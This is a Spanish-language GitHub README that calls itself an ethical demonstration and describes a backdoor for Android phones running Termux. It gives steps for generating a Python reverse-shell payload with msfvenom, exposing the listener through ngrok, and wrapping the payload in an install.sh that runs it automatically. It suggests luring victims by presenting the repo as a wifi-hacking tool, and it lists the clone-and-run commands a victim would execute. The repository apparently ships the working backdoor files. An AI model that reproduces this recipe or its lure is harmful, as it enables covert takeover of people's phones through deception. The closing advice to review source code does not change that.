# Backdoor Python con auto ejecutable para recibir shell en telefon

NO DEBEN DESCARGAR ESTE REPOSITORIO YA QUE ESTA HECHO CON FINES ETICOS Y PARA MOSTRAR COMO SE HARIA EL PROCESO, SI DESCARGAN Y EJECUTAN ESTE REPOSITORIO ALGUIEN PODRIA OBTENER UNA SHELL DE SU CELULAR 


Paso 1:

crear el payload en python con msfvenom

paso 2:

si van a hacerlo fuera de lan usar ngrok y dejar la consola en escucha

paso 3:

crear un auto instalador en .sh que dara permisos al archivo .py con el backdoor y seguidamente lo ejecutara de forma automatica, de este modo ya obtenemos la shell.

paso 4: 

subir el repositorio a github y pasarlo a las personas diciendo por ejemplo, mira esta herramienta para termux hackea redes wifi..

CONCLUSION Y MORALEJA:

Siempre que vayan a descargar proyectos de github deben revisar el codigo fuente para saber que estan descargando y que estan ejecutando ya que muchas veces herramientas que se suben aqui son backdoors y personas acceden a su telefono sin que ustedes se den cuenta

ademas, ni Google Protect ni aplicaciones antivirus detectan esto, ya que el virus corre adentro de un emulador LINUX en este caso podria ser TERMUX para android o otro emulador, sin embargo al obtener la shell ya tenemos accesso a todo su telefono sin ser detectados por los antivirus.

Por eso como consejo personal, siempre que descarguen algun script, antes de ejecutar deben revisar el codigo fuente y entenderlo para saber como funciona tal script y que funciones ejecutara.

NOTA: pueden checar el archivo .py para que se den cuenta como se veria un backdoor en python generado con MSFVENOM
NOTA 2: Tambien les dejo el archivo .sh que seria el encargado de ejecutar el virus y darle los permisos, pueden checarlo.


lo que su victima haria seria esto

abrir termux

ejecutar

git clone https://github.com/byteSalgado/testingrepost/

cd testingrepost
chmod +x install.sh
./install.sh

listo nosotros ya tenemos el acceso a su telefono y sin ser detectados.


